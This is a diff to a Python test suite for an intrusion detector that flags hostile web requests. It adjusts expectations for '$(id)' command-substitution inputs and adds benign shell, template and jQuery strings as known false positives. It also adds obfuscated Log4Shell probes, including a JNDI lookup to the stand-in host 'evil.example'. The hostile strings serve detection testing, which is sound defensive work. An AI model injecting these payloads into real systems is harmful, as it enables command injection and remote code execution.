@@ -574,14 +574,14 @@ _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES: list[TargetedCase] = [
         True,
     ),
     TargetedCase(
-        "round6_dollar_paren_ambiguous_bare_query_param_never_flagged",
+        "round6_dollar_paren_ambiguous_bare_query_param",
         _query_param_request("$(id)"),
-        False,
+        True,
     ),
     TargetedCase(
-        "round6_dollar_paren_ambiguous_bare_url_path_never_flagged",
+        "round6_dollar_paren_ambiguous_bare_url_path",
         _url_path_request("$(id)"),
-        False,
+        True,
     ),
     TargetedCase(
         "round6_dollar_paren_ambiguous_bare_raw_body_benign",
@@ -589,12 +589,12 @@ _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES: list[TargetedCase] = [
         False,
     ),
     TargetedCase(
-        "round6_dollar_paren_ambiguous_keyword_nearby_never_flagged_query_param",
+        "round6_sql_keyword_not_glued_no_longer_exempts_dollar_query_param",
         _query_param_request("x$(id) JOIN accounts"),
-        False,
+        True,
     ),
     TargetedCase(
-        "round6_dollar_paren_ambiguous_keyword_glued_never_flagged_query_param",
+        "round6_sql_keyword_glued_no_space_still_exempts_dollar_query_param",
         _query_param_request("SELECT$(id)FROM users"),
         False,
     ),
@@ -674,6 +674,81 @@ _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES: list[TargetedCase] = [
 ]
 
 
+_DOLLAR_SUBSTITUTION_DISCLOSED_FP_AND_LOG4SHELL_BONUS_TARGETED_CASES: list[
+    TargetedCase
+] = [
+    TargetedCase(
+        "disclosed_fp_shell_docs_var_expansion_query_param",
+        _query_param_request("export PATH=${HOME}/bin"),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_shell_docs_var_expansion_url_path",
+        _url_path_request("export PATH=${HOME}/bin"),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_template_dollar_brace_var_query_param",
+        _query_param_request("Set the amount with ${amount} in the template."),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_template_dollar_brace_var_url_path",
+        _url_path_request("Set the amount with ${amount} in the template."),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_template_makefile_variable_query_param",
+        _query_param_request(
+            "The Makefile references $(CC) and $(CFLAGS) for the compiler."
+        ),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_template_makefile_variable_url_path",
+        _url_path_request(
+            "The Makefile references $(CC) and $(CFLAGS) for the compiler."
+        ),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_jquery_selector_bare_id_call_query_param",
+        _query_param_request("$(id).addClass('active');"),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_jquery_selector_bare_id_call_url_path",
+        _url_path_request("$(id).addClass('active');"),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_jquery_selector_hash_id_call_query_param",
+        _query_param_request("$('#submit-button').on('click', handleSubmit);"),
+        True,
+    ),
+    TargetedCase(
+        "disclosed_fp_jquery_selector_hash_id_call_url_path",
+        _url_path_request("$('#submit-button').on('click', handleSubmit);"),
+        True,
+    ),
+    TargetedCase(
+        "log4shell_url_path_bonus_obfuscated_lower_bare",
+        _url_path_request("${lower:j}ndi"),
+        True,
+    ),
+    TargetedCase(
+        "log4shell_url_path_bonus_obfuscated_default_value_bare",
+        _url_path_request("${::-j}ndi"),
+        True,
+    ),
+    TargetedCase(
+        "log4shell_url_path_bonus_obfuscated_nested_full_exploit",
+        _url_path_request("${${lower:j}ndi:ldap://evil.example/a}"),
+        True,
+    ),
+]
+
+
 async def _mechanism_for_index(mechanisms: tuple[str, ...], index: int) -> str:
     return mechanisms[index % len(mechanisms)]
 
@@ -688,6 +763,18 @@ def _fraction(numerator: int, denominator: int) -> str:
     percentage = 100.0 * numerator / denominator if denominator else 0.0
     return f"{numerator}/{denominator} ({percentage:.1f}%)"
 
+
+_GLUED_KEBAB_IDENTIFIER_BACKTICK_KNOWN_FP_REASON = (
+    "a kebab-style identifier glued to a backtick (`header`x-forwarded-for`value`, "
+    "`config`well-known`here`) is Phase 0's own accepted ambiguous-gate tradeoff "
+    "for the backtick discriminator, already pinned in query_param by "
+    "test_glued_kebab_identifier_backtick_payload_flagged_in_query_param and "
+    "measured, not assumed, to also fire in url_path once ruling item 2 made "
+    "that branch reachable there (58a9e860); the round-robin index for these "
+    "two corpus entries now lands on query_param/url_path respectively after "
+    "later corpus growth, surfacing the same pre-existing, already-documented "
+    "tradeoff here rather than a new one"
+)
 
 _KNOWN_E2E_FALSE_POSITIVES: dict[str, str] = {
     "cmd_injection_prose_semicolon_quoted_absolute_shell_ls": (
@@ -716,6 +803,12 @@ _KNOWN_E2E_FALSE_POSITIVES: dict[str, str] = {
     ),
     "cmd_injection_value_bare_shell_control": (
         _WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON
+    ),
+    "cmd_injection_glued_kebab_identifier_header_forward": (
+        _GLUED_KEBAB_IDENTIFIER_BACKTICK_KNOWN_FP_REASON
+    ),
+    "cmd_injection_glued_kebab_identifier_config_well_known": (
+        _GLUED_KEBAB_IDENTIFIER_BACKTICK_KNOWN_FP_REASON
     ),
 }
 
@@ -793,6 +886,12 @@ async def test_detect_penetration_attempt_recall_and_false_positive_rate() -> No
         if result.is_threat != targeted.expect_detected:
             round6_targeted_failures.append(targeted.case_id)
 
+    dollar_fp_and_log4shell_bonus_failures: list[str] = []
+    for targeted in _DOLLAR_SUBSTITUTION_DISCLOSED_FP_AND_LOG4SHELL_BONUS_TARGETED_CASES:
+        result = await detect_penetration_attempt(targeted.request, _CONFIG)
+        if result.is_threat != targeted.expect_detected:
+            dollar_fp_and_log4shell_bonus_failures.append(targeted.case_id)
+
     wall_time_seconds = time.monotonic() - start
 
     report_lines = [
@@ -848,6 +947,15 @@ async def test_detect_penetration_attempt_recall_and_false_positive_rate() -> No
             f"  {targeted.case_id}: expected={targeted.expect_detected}"
         )
     report_lines.append("")
+    report_lines.append(
+        "targeted dollar-substitution disclosed-FP and log4shell "
+        "url_path bonus cases (ruling items 1-2):"
+    )
+    for targeted in _DOLLAR_SUBSTITUTION_DISCLOSED_FP_AND_LOG4SHELL_BONUS_TARGETED_CASES:
+        report_lines.append(
+            f"  {targeted.case_id}: expected={targeted.expect_detected}"
+        )
+    report_lines.append("")
     report_lines.append("known end-to-end false positives (documented, still counted):")
     for case_id, reason in _KNOWN_E2E_FALSE_POSITIVES.items():
         report_lines.append(f"  {case_id}: {reason}")
@@ -857,6 +965,9 @@ async def test_detect_penetration_attempt_recall_and_false_positive_rate() -> No
     assert not targeted_failures, f"{targeted_failures}\n{report}"
     assert not backtick_targeted_failures, f"{backtick_targeted_failures}\n{report}"
     assert not round6_targeted_failures, f"{round6_targeted_failures}\n{report}"
+    assert not dollar_fp_and_log4shell_bonus_failures, (
+        f"{dollar_fp_and_log4shell_bonus_failures}\n{report}"
+    )
 
     assert malicious_detected >= BASELINE_MALICIOUS_DETECTED_TOTAL, (
         f"overall recall regressed: baseline={BASELINE_MALICIOUS_DETECTED_TOTAL} "
